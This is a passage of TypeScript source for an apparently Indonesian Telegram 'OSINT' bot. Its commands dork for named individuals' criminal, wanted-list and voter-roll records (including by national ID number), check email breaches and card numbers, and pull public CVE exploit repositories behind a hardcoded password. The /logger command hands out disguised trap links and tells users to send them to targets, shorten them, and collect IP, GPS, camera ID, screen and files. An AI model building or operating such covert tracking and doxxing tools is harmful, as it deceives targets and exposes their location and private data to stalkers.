                    `└ 🌐 <a href="https://www.google.com/search?q=${q3}">Agregator Laporan Pailit Pribadi / Pidana di Mesin Publikasi Berita Terverifikasi</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Investigasi rekam jejak litigasi historikal, blacklist KPR, perceraian, sengketa lahan, dll secara bebas.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('dpo', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /dpo [Nama Pribadi/Alias]");
      const q = encodeURIComponent(`"Daftar Pencarian Orang" OR "DPO" "${args}" site:polri.go.id OR site:kejaksaan.go.id OR site:kpk.go.id`);
      const q2 = encodeURIComponent(`"Buronan" OR "Tersangka" "${args}" site:go.id`);
      
      const reply = `<b>🚔 INDONESIA CYBER INTELLIGENCE (BURONAN/DPO)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🕵️ <b>TARGET INVESTIGASI:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ DATABASE APARAT PENEGAK HUKUM (POLRI / KEJAGUNG):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q}">Scraping Indeks DPO Resmi (Polda Regional / Bareskrim / Kejaksaan)</a>\n\n` +
                    `<b>[2] 🛡️ KOMISI PEMBERANTASAN KORUPSI (KPK/PPATK):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Penelusuran Penetapan Tersangka / Rilis Daftar Cekal Imigrasi Siber</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Memanfaatkan mesin crawler Dorking agregasi institusi Reserse, Bareskrim & Interpol NCB Jakarta.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('ojk', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /ojk [Nama Pinjol/Platform Berizin]");
      
      const legalPinjol = ['akulaku','kredivo','indodana','shopeepay','spaylater','dana','gopay','kreditpintar','rupiahcepat','adapundi','uangme','pinjamgo','tunaiku','julo','uatas','ada kami','kredit pintar','modal nasional','julo','easycash','kredito','pinjamduit','finmas','tambadana'];
      const targetQuery = args.toLowerCase();
      let estStatus = "⚠️ <b>UNDEFINED OJK ID:</b> Status Abu-abu. Membutuhkan Verifikasi Manual Sesuai Dokumen Tanda Terdaftar OJK & AFPI.";
      
      if (legalPinjol.some(lp => targetQuery.includes(lp))) {
          estStatus = "✅ <b>PROYEKSI LEGALITAS:</b> Terindikasi Platform Tervalidasi Publik Nasional (Berdasarkan Top Tier AFPI).";
      } else if (targetQuery.includes('pinjol') || targetQuery.includes('dana fast') || targetQuery.includes('tunai kilat') || targetQuery.includes('uang kilat') || targetQuery.includes('koperasi bintang') || targetQuery.includes('dana kilat') || targetQuery.includes('dompet')) {
          estStatus = "❌ <b>PROYEKSI ILEGAL / BLACKLIST:</b> Tingkat Risiko Sedang-Tinggi Aplikasi Rentan Pencurian Data Kontak / Spam Galbay.";
      }
      
      const q1 = encodeURIComponent(`"${args}" site:ojk.go.id filetype:pdf`);
      const q2 = encodeURIComponent(`"Satgas Waspada Investasi" OR "SWI" "Ilegal" "${args}"`);
      
      const reply = `<b>🏦 OJK FINTECH & P-2-P LENDING AUDIT</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `💲 <b>ENTITAS PLATFORM KEUANGAN:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🤖 PREDIKTOR LEGALITAS & RISIKO ALGORITMA:</b>\n> ${estStatus}\n\n` +
                    `<b>[2] ⚖️ DORKING DATABASE SK REGULATOR OJK / AFPI:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Pemindaian Tanda Berizin Tertulis SK OJK Berbentuk Surat/PDF</a>\n\n` +
                    `<b>[3] 🚨 INVESTIGASI BLACKLIST (Satgas PASTI / SWI):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Tracer Jejak Penindakan Blokir Kominfo / Satgas Waspada Investasi Publik</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Warning: Prediktor ini tidak menggantikan fungsi validasi layanan pelanggan OJK di nomor 157.</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('kpu', (ctx) => {
      const args = ctx.message.text.substring(5).trim();
      if (!args) return ctx.reply("⚠️ Format: /kpu [Nama Pemilih / 16-Digit NIK]");
      const q1 = encodeURIComponent(`"${args}" site:kpu.go.id OR site:lindungihakpilihmu.kpu.go.id OR site:infopemilu.kpu.go.id`);
      const q2 = encodeURIComponent(`"Daftar Pemilih Tetap" "${args}" filetype:pdf OR filetype:xls OR filetype:csv`);
      const q3 = encodeURIComponent(`"Berita Acara Penetapan" "Pemilu" "${args}"`);
      
      const reply = `<b>🗳️ KPU ELECTORAL & DPT ANALYZER (SIDALIH)</b>\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `🎯 <b>ENTITAS SUBJEK PEMILIH / CALON:</b> <code>${args}</code>\n\n` +
                    `<b>[1] 🏛️ PEMINDAIAN DATABASE INDUK SIDALIH KPU:</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q1}">Penelusuran Web Register Hak Pilih Nasional (LindungiHakPilihmu/InfoPemilu)</a>\n\n` +
                    `<b>[2] 📑 AUDIT RESOLUSI PENETAPAN PER KELURAHAN (TPS):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q2}">Eksfiltrasi & Dork Dokumen PDF DPT Panlok Tingkat Kecamatan / RT / RW</a>\n\n` +
                    `<b>[3] 🔍 JEJAK REKAM PANITIA / KPPS (Khusus Struktur):</b>\n` +
                    `└ 🌐 <a href="https://www.google.com/search?q=${q3}">Skrining Nama dalam Log Berita Acara Rekapitulasi Rapat / Panwaslu Daerah</a>\n\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n<i>⚠️ Alat bantu Open Source ini mempercepat metode pelacakan domisili/lokasi TPS berdasarkan footprint kebocoran data elektoral KPU publik yang terindeks (Crawler).</i>`;
      ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
    });

    bot.command('leak', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /leak email@domain.com");
      const q = args[1];
      
      try {
        const response = await axios.get(`https://leakcheck.io/api/public?check=${encodeURIComponent(q)}`);
        const data = response.data;
        
        let res = `<b>⚠️ DATA COMPROMISE CHECKER</b>\n━━━━━━━━━━━━━━━━━━━━\n🔍 Target: <code>${q}</code>\n`;
        if(!data.success || !data.found) {
            res += `\n✅ <b>DATA AMAN</b>\nTidak ditemukan catatan kebocoran di public breach database.\n`;
        } else {
            res += `\n❌ <b>WARNING: ${data.found} LEAKS DETECTED</b>\n\n<b>Terekspos di breach database:</b>\n`;
            data.sources.slice(0, 15).forEach((b: any) => {
                res += `• ${b.name} ${b.date ? `(${b.date})` : ''}\n`;
            });
            if (data.found > 15) {
                res += `• ...dan ${data.found - 15} lainnya.\n`;
            }
            res += `\n<i>⚠️ Saran: Segera ganti password Anda di layanan terkait dan aktifkan 2FA.</i>\n`;
        }
        res += `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(res, { parse_mode: 'HTML' });
      } catch (err) {
        ctx.reply("❌ Gagal mengecek data leak dari server publik.");
      }
    });
    
    bot.command('shodan', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /shodan 8.8.8.8");
      const ip = args[1];
      
      try {
        const response = await axios.get(`https://internetdb.shodan.io/${ip}`);
        const data = response.data;
        let res = `<b>👁️ SHODAN INTERNETDB SCAN</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 Target: <code>${ip}</code>\n\n`;
        if (data.hostnames && data.hostnames.length > 0) res += `🏷️ Hostnames: ${data.hostnames.join(', ')}\n`;
        if (data.ports && data.ports.length > 0) {
            res += `\n<b>Open Ports:</b>\n`;
            data.ports.forEach((p: number) => res += `• ${p}\n`);
        } else {
            res += `\n🔒 Tidak ada port terbuka yang terdeteksi.\n`;
        }
        
        if (data.vulns && data.vulns.length > 0) {
            res += `\n<b>Vulnerabilities (CVE):</b>\n`;
            data.vulns.slice(0, 10).forEach((v: string) => res += `• ${v}\n`);
            if (data.vulns.length > 10) res += `• ...dan ${data.vulns.length - 10} lainnya.\n`;
        }
        res += `\n━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(res, { parse_mode: 'HTML' });
      } catch (err: any) {
        if(err.response?.status === 404) {
            ctx.reply(`<b>👁️ SHODAN INTERNETDB SCAN</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 Target: <code>${ip}</code>\n\nTidak ada data yang ditemukan di database Shodan untuk IP ini.\n━━━━━━━━━━━━━━━━━━━━`, { parse_mode: 'HTML' });
        } else {
            ctx.reply(`❌ Gagal mengambil data dari Shodan InternetDB API.`);
        }
      }
    });
    
    bot.command('cc_check', (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /cc_check 45321123...");
      const cc = args[1].replace(/[^0-9]/g, '');
      
      let sum = 0;
      let shouldDouble = false;
      for (let i = cc.length - 1; i >= 0; i--) {
        let digit = parseInt(cc.charAt(i), 10);
        if (shouldDouble) {
          if ((digit *= 2) > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      const valid = (sum % 10) === 0;
      
      const bins = {"4": "Visa", "5": "MasterCard", "3": "American Express", "6": "Discover"};
      const network = bins[cc.charAt(0)] || "Unknown Network";

      ctx.reply(`<b>💳 CREDIT CARD OSINT</b>\n━━━━━━━━━━━━━━━━━━━━\n🔢 Nomor: <code>${cc}</code>\n🏦 Jaringan: ${network}\n📊 Status Luhn Algoritma: <b>${valid ? "✅ VALID" : "❌ INVALID"}</b>\n\n<i>Info: Ini hanya mengecek algoritma format angka (Luhn), bukan ngecek saldo atau validity ke bank.</i>\n━━━━━━━━━━━━━━━━━━━━`, { parse_mode: 'HTML' });
    });

    bot.command('cve', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 3) return ctx.reply("⚠️ Format salah.\nContoh: /cve CVE-2021-44228 [PASSWORD]\n<i>(Ingat kunci dengan pas 1928)</i>", { parse_mode: 'HTML' });
      
      const q = args[1].toUpperCase();
      const pw = args[2];

      if (pw !== "1928") {
          return ctx.reply("❌ KUNCI AKSES DITOLAK: Password sistem tidak valid.");
      }
      
      const statusMsg = await ctx.reply(`[⏳] <b>Menganalisis ${q}...</b>\n1. Mengirim satelit pencarian...`, { parse_mode: 'HTML' });
      
      try {
        let repoUrl = "";
        let repoDataStr = "";
        let githubSummary = "";
        
        try {
            const ghRes = await axios.get(`https://api.github.com/search/repositories?q=${q}+poc&sort=stars&order=desc`, {
               headers: { "User-Agent": "Mozilla/5.0", "Accept": "application/vnd.github.v3+json" }
            });
            if (ghRes.data && ghRes.data.items && ghRes.data.items.length > 0) {
               const topRepo = ghRes.data.items[0];
               repoUrl = topRepo.html_url;
               githubSummary = topRepo.description || 'Tidak ada deskripsi';
               
               const readmeRes = await axios.get(`https://raw.githubusercontent.com/${topRepo.full_name}/${topRepo.default_branch}/README.md`).catch(()=>null);
               if (readmeRes && readmeRes.data) {
                   repoDataStr = String(readmeRes.data).substring(0, 1500); // 1.5k max chars
               }
            }
        } catch(e) {}
        
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `[⏳] <b>Menganalisis ${q}...</b>\n2. Mempelajari struktur kerentanan secara mendalam...`, { parse_mode: 'HTML' });
        
        let cveInfo = "";
        try {
            const response = await axios.get(`https://cvedb.shodan.io/cve/${q}`);
            const data = response.data;
            let pubTime = 'N/A';
            if (data.published_time) {
                pubTime = new Date(data.published_time).toLocaleDateString();
            }
            cveInfo = `• <b>Deskripsi:</b> ${data.summary || 'N/A'}\n• <b>CVSS Score:</b> ${data.cvss || 'N/A'}\n• <b>CVSS Version:</b> ${data.cvss_version || 'N/A'}\n• <b>Published Date:</b> ${pubTime}`;
        } catch(e) {
            cveInfo = "• <b>Deskripsi:</b> Data tidak ditemukan di Shodan CVE database.";
        }
        
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `[⏳] <b>Menganalisis ${q}...</b>\n3. Menyusun laporan red team...`, { parse_mode: 'HTML' });
        
        let finalReply = `<b>⚠️ ADVANCED CVE EXPLOIT ANALYSIS</b>\n━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Target:</b> <code>${q}</code>\n\n`;
        finalReply += `<b>[1] INFORMASI KERENTANAN:</b>\n${cveInfo}\n\n`;
        
        if (repoUrl) {
           finalReply += `<b>[2] REPOSITORI EKSPLOITASI (PoC):</b>\n`;
           finalReply += `• <b>URL:</b> <a href="${repoUrl}">${repoUrl}</a>\n`;
           finalReply += `• <b>Summary:</b> ${githubSummary}\n\n`;
           if (repoDataStr) {
               const safeReadme = repoDataStr.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
               finalReply += `<b>[3] SOURCE CODE / DOKUMENTASI (EXCERPT):</b>\n<pre><code>${safeReadme}</code></pre>`;
           } else {
               finalReply += `<b>[3] SOURCE CODE / DOKUMENTASI:</b>\n<i>Tidak ada file README.md yang terpublikasi atau tidak dapat diakses.</i>`;
           }
        } else {
           finalReply += `<b>[2] EKSPLOITASI & PoC:</b>\n❌ <i>Tidak ditemukan repositori PoC/Exploit publik yang valid di GitHub.</i>`;
        }

        if (finalReply.length > 4050) finalReply = finalReply.substring(0, 4000) + "\n\n... (terpotong)";
        
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, finalReply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }).catch(async (e) => {
              // fallback if HTML parsing fails due to payload data
              const safeText = `<b>⚠️ ADVANCED CVE EXPLOIT ANALYSIS</b>\n━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Target:</b> <code>${q}</code>\n\n❌ Gagal memformat data HTML. Output terlalu besar/mengandung karakter dilarang.`;
              await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, safeText, { parse_mode: 'HTML' });
        });
        
      } catch (err: any) {
        await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ Gagal memproses data eksploitasi: ${err.message}`, { parse_mode: 'HTML' });
      }
    });
    
    bot.command('cname', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /cname www.domain.com");
      const domain = args[1];

      try {
        const records = await dns.promises.resolveCname(domain);
        let res = `<b>🔀 DNS CNAME MAPPING</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 Target: <code>${domain}</code>\n\n`;
        res += `<b>CNAME Records:</b>\n`;
        records.forEach(r => res += `• <code>${r}</code>\n`);
        res += `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(res, { parse_mode: 'HTML' });
      } catch (err) {
        ctx.reply(`❌ Gagal mengambil CNAME record atau record tidak ditemukan untuk ${domain}.`);
      }
    });

    bot.command('txt', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("⚠️ Format salah. Contoh: /txt domain.com");
      const domain = args[1];

      try {
         const records = await dns.promises.resolveTxt(domain);
         let res = `<b>📝 DNS TXT RECORD OVERVIEW</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 Target: <code>${domain}</code>\n\n`;
         res += `<b>TXT Records (SPF, DMARC, Domain Verifications):</b>\n`;
         records.forEach(r => res += `• <code>${r.join(' ')}</code>\n\n`);
         res += `━━━━━━━━━━━━━━━━━━━━`;
         ctx.reply(res, { parse_mode: 'HTML' });
      } catch (err) {
         ctx.reply(`❌ Gagal mengambil TXT record atau record tidak ditemukan untuk ${domain}.`);
      }
    });

    bot.command('sethost', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length > 1) {
        let newHost = args[1];
        if (!newHost.startsWith('http')) newHost = 'https://' + newHost;
        appHost = newHost;
        await ctx.reply(`✅ <b>System Host diubah manual ke:</b>\n<code>${appHost}</code>\n\nCoba jalankan /logger kembali.`, {parse_mode: 'HTML'});
        
        const isLocal = appHost.includes('localhost') || appHost.includes('127.0.0.1');
        if (!isLocal && webhookPath && bot) {
          try {
            const webhookUrl = `${appHost.replace(/\/$/, '')}${webhookPath}`;
            await bot.telegram.setWebhook(webhookUrl);
            await ctx.reply(`🌐 <b>Webhook Synced!</b>\nNew endpoint set.`, {parse_mode: 'HTML'});
          } catch (e: any) {
            await ctx.reply(`❌ <b>Failed to sync Webhook:</b>\n${e.message}`, {parse_mode: 'HTML'});
          }
        }
      } else {
        ctx.reply(`ℹ️ <b>Host saat ini:</b>\n<code>${appHost}</code>\n\nJika link IP Logger error (problem loading page/localhost/404), gunakan perintah:\n<code>/sethost https://URL_WEB_ANDA</code>\nAtau pastikan web app Anda sedang online.`, {parse_mode: 'HTML'});
      }
    });

    bot.command('logger', (ctx) => {
      const id = generateTrapId(ctx.chat.id);
      
      let replyMessage = `🎣 <b>STEALTH LINK GENERATED (ENTERPRISE GRADE)</b>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
      
      Object.entries(templates).forEach(([key, tmpl]) => {
        const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
      });
      
      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💡 <b>CARA KERJA:</b>\n` +
                      `1. Kirim link di atas ke target.\n` +
                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
      
      ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('ip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      const ip = args.length > 1 ? args[1] : '';
      let url = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;
      
      try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === 'success') {
          const mapLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
          let reply = `<b>🌐 TARGET IP ANALYTICS PRO (ENTERPRISE EDITION)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>IP QUERY:</b> <code>${data.query}</code>\n\n` +
                      `🏢 <b>NETWORK & INFRA:</b>\n` +
                      `├ ISP: ${data.isp || '-'}\n` +
                      `├ ORG: ${data.org || '-'}\n` +
                      `├ ASN: ${data.as || '-'} (${data.asname || '-'}) \n` +
                      `└ REVERSE: ${data.reverse || '-'}\n\n` +
                      `📍 <b>LOKASI REGIONAL:</b>\n` +
                      `├ BENUA: ${data.continent || '-'}\n` +
                      `├ NEGARA: ${data.country || '-'} (${data.countryCode || '-'}) \n` +
                      `├ REGION: ${data.regionName || '-'}\n` +
                      `├ KOTA/DISTRIK: ${data.city || '-'} / ${data.district || '-'}\n` +
                      `├ KODEPOS: ${data.zip || '-'}\n` +
                      `└ ZONA WAKTU: ${data.timezone || '-'} (GMT${data.offset/3600})\n\n` +
                      `🌎 <b>SPATIAL & MAPS:</b>\n` +
                      `├ COORD: <code>${data.lat || '-'}, ${data.lon || '-'}</code>\n` +
                      `└ GMAPS: <a href="${mapLink}">Lihat Titik BTS</a>\n\n` +
                      `🛡️ <b>RISK DETECTIONS:</b>\n` +
                      `├ JARINGAN SELULER (4G/5G): ${data.mobile ? '✅ YA' : '❌ TIDAK'}\n` +
                      `├ PROXY/VPN DETEKSI: ${data.proxy ? '⚠️ TERBURUK/VPN DETECTED' : '✅ BERSIH'}\n` +
                      `└ KOMPUTER SERVER (CLOUD): ${data.hosting ? '⚠️ DATA CENTER' : '✅ RESIDENTIAL/HOME'}\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `⚠️ <i>Info: Geolocation IP mengacu pada titik BTS provider pusat terdekat, bukan koordinat GPS pasti perangkat. Gunakan Logger Link untuk pelacakan fisik.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
        } else {
          ctx.reply("❌ Gagal mendapatkan informasi IP.");
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek IP.");
      }
    });

    bot.command('whois', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /whois google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`🔍 Sedang menganalisis detail registrar WHOIS untuk <b>${domain}</b>...`, { parse_mode: 'HTML' });
        const res = await fetch(`https://networkcalc.com/api/dns/whois/${domain}`);
        const data = await res.json();
        if (data.status === 'OK' && data.whois) {
          let txt = `🌐 <b>WHOIS DATA ANALYTICS (ENTERPRISE EDITION)</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                    `📝 <b>REGISTRAR INFO:</b>\n` +
                    `└ Name: ${data.whois.registrar || '-'}\n\n` +
                    `📆 <b>DATES:</b>\n` +
                    `├ CREATED: ${data.whois.creation_date || '-'}\n` +
                    `├ UPDATED: ${data.whois.updated_date || '-'}\n` +
                    `└ EXPIRED: ${data.whois.expiration_date || '-'}\n\n` +
                    `📡 <b>NAME SERVERS:</b>\n` +
                    (data.whois.name_servers || []).map((ns:any)=>`├ <code>${ns}</code>`).join('\n').replace(/├$/, '└') +
                    `\n━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Query WHOIS berhasil.</i>`;
          ctx.reply(txt, {parse_mode: 'HTML'});
        } else {
          ctx.reply(`❌ Whois data tidak ditemukan untuk <code>${domain}</code>. (Pastikan format domain benar tanpa https://)`, {parse_mode: 'HTML'});
        }
      } catch (e) {
        ctx.reply("❌ Terjadi kesalahan sistem saat mengecek Whois.");
      }
    });

    bot.command('dns', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format salah. Contoh: /dns google.com");
      const domain = args[1].replace(/https?:\/\//, '').replace(/\/$/, '');
      
      try {
        ctx.reply(`📡 Menarik data DNS Records & Routing IP untuk <b>${domain}</b> via Cloudflare/Google DoH...`, { parse_mode: 'HTML' });
        
        const fetchDns = async (type: string) => {
           try {
               const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
               const data = await res.json();
               return data.Answer || [];
           } catch { return []; }
        };

        const [a, aaaa, mx, txt, cname, ns] = await Promise.all([
           fetchDns('A'), fetchDns('AAAA'), fetchDns('MX'), fetchDns('TXT'), fetchDns('CNAME'), fetchDns('NS')
        ]);

        let txtOutput = `<b>📡 DNS MAPPING PRO (ENTERPRISE EDITION)</b>\n` +
                  `━━━━━━━━━━━━━━━━━━━━\n` +
                  `💎 <b>DOMAIN:</b> <code>${domain}</code>\n\n`;
        
        if (a.length > 0) txtOutput += `<b>[+] A RECORDS :</b>\n` + a.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (aaaa.length > 0) txtOutput += `<b>[+] AAAA RECORDS :</b>\n` + aaaa.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (mx.length > 0) txtOutput += `<b>[+] MX RECORDS :</b>\n` + mx.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (ns.length > 0) txtOutput += `<b>[+] NS (NAME SERVERS) :</b>\n` + ns.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (txt.length > 0) txtOutput += `<b>[+] TXT RECORDS :</b>\n` + txt.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';
        if (cname.length > 0) txtOutput += `<b>[+] CNAME RECORDS :</b>\n` + cname.map((r:any) => `├ <code>${r.data}</code>`).join('\n') + '\n\n';

        txtOutput += `━━━━━━━━━━━━━━━━━━━━\n` + `✅ <i>DoH Query Selesai.</i>`;
        
        if(txtOutput.length > 4000) txtOutput = txtOutput.substring(0, 3950) + "\n\n... (Terpotong limit)";
        if(a.length === 0 && ns.length === 0) return ctx.reply("❌ Data DNS tidak ditemukan.");
        ctx.reply(txtOutput, {parse_mode: 'HTML'});
      } catch (e: any) {
        ctx.reply(`❌ Terjadi kesalahan sistem (DoH server gagal): ${e.message}`);
      }
    });

    bot.command('domain', (ctx) => ctx.reply("Gunakan /whois [domain] atau /dns [domain]"));

    bot.command('email', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2 || !args[1].includes('@')) return ctx.reply("Format salah. Contoh: /email target@example.com");
      const email = args[1];
      
      try {
        const domain = email.split("@")[1];
        const records = await resolveMx(domain);
        if (records && records.length > 0) {
          const reply = `<b>📧 EMAIL MX VALIDATOR (ENTERPRISE EDITION)</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🎯 <b>TARGET:</b> <code>${email}</code>\n` +
                        `🌐 <b>DOMAIN:</b> <code>${domain}</code>\n\n` +
                        `✅ STATUS:<b> AKTIF Menerima Email</b>\n\n` +
                        `📋 <b>MX RECORDS:</b>\n` +
                        records.map((r, idx) => `${idx === records.length - 1 ? '└' : '├'} [Pri: ${r.priority}] ${r.exchange}`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply(`❌ Tidak ditemukan MX records untuk domain ${domain}.`);
        }
      } catch (e) {
        ctx.reply(`❌ Format valid, tapi kami tidak bisa memverifikasi MX records (domain mungkin tidak aktif atau memblokir pengecekan).`);
      }
    });

    bot.command('username', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("❌ <b>Format salah.</b>\nContoh: <code>/username targetnya</code>", { parse_mode: 'HTML' });
      
      const rawInput = args.slice(1).join('').toLowerCase();
      const username = rawInput.replace(/[^a-z0-9_.-]/g, '');
      if (!username) return ctx.reply("❌ <b>Username tidak valid.</b>", { parse_mode: 'HTML' });
      
      ctx.reply(`🔍 Memindai jejak digital untuk <b>@${username}</b>...\n<i>Mengecek puluhan platform...</i>`, { parse_mode: 'HTML' });
      
      const platforms = [
        // Global Social Media & Tech (~100 Platforms)
        { name: "GitHub", url: `https://github.com/${username}` },
        { name: "Twitter", url: `https://twitter.com/${username}` },
        { name: "Instagram", url: `https://www.instagram.com/${username}/` },
        { name: "TikTok", url: `https://www.tiktok.com/@${username}` },
        { name: "YouTube", url: `https://www.youtube.com/@${username}` },
        { name: "Facebook", url: `https://www.facebook.com/${username}` },
        { name: "Pinterest", url: `https://www.pinterest.com/${username}` },
        { name: "Reddit", url: `https://www.reddit.com/user/${username}` },
        { name: "Tumblr", url: `https://${username}.tumblr.com` },
        { name: "Medium", url: `https://medium.com/@${username}` },
        { name: "Vimeo", url: `https://vimeo.com/${username}` },
        { name: "SoundCloud", url: `https://soundcloud.com/${username}` },
        { name: "Spotify", url: `https://open.spotify.com/user/${username}` },
        { name: "Twitch", url: `https://www.twitch.tv/${username}` },
        { name: "Steam", url: `https://steamcommunity.com/id/${username}` },
        { name: "Flickr", url: `https://www.flickr.com/people/${username}` },
        { name: "Patreon", url: `https://www.patreon.com/${username}` },
        { name: "Dev.to", url: `https://dev.to/${username}` },
        { name: "Wattpad", url: `https://www.wattpad.com/user/${username}` },
        { name: "VK", url: `https://vk.com/${username}` },
        { name: "GitLab", url: `https://gitlab.com/${username}` },
        { name: "Linktree", url: `https://linktr.ee/${username}` },
        { name: "Dribbble", url: `https://dribbble.com/${username}` },
        { name: "Behance", url: `https://www.behance.net/${username}` },
        { name: "About.me", url: `https://about.me/${username}` },
        { name: "Fiverr", url: `https://www.fiverr.com/${username}` },
        { name: "Gumroad", url: `https://gumroad.com/${username}` },
        { name: "Quora", url: `https://www.quora.com/profile/${username}` },
        { name: "Telegram", url: `https://t.me/${username}` },
        { name: "CodePen", url: `https://codepen.io/${username}` },
        { name: "HackerRank", url: `https://www.hackerrank.com/${username}` },
        { name: "LeetCode", url: `https://leetcode.com/${username}` },
        { name: "Kaggle", url: `https://www.kaggle.com/${username}` },
        { name: "Pastebin", url: `https://pastebin.com/u/${username}` },
        { name: "ProductHunt", url: `https://www.producthunt.com/@${username}` },
        { name: "Slack", url: `https://${username}.slack.com` },
        { name: "Trello", url: `https://trello.com/${username}` },
        { name: "Bandcamp", url: `https://bandcamp.com/${username}` },
        { name: "Last.fm", url: `https://www.last.fm/user/${username}` },
        { name: "ReverbNation", url: `https://www.reverbnation.com/${username}` },
        { name: "Letterboxd", url: `https://letterboxd.com/${username}` },
        { name: "MyAnimeList", url: `https://myanimelist.net/profile/${username}` },
        { name: "Goodreads", url: `https://www.goodreads.com/${username}` },
        { name: "Strava", url: `https://www.strava.com/athletes/${username}` },
        { name: "TripAdvisor", url: `https://www.tripadvisor.com/members/${username}` },
        { name: "Roblox", url: `https://www.roblox.com/user.aspx?username=${username}` },
        { name: "Minecraft", url: `https://namemc.com/profile/${username}` },
        { name: "Chess.com", url: `https://www.chess.com/member/${username}` },
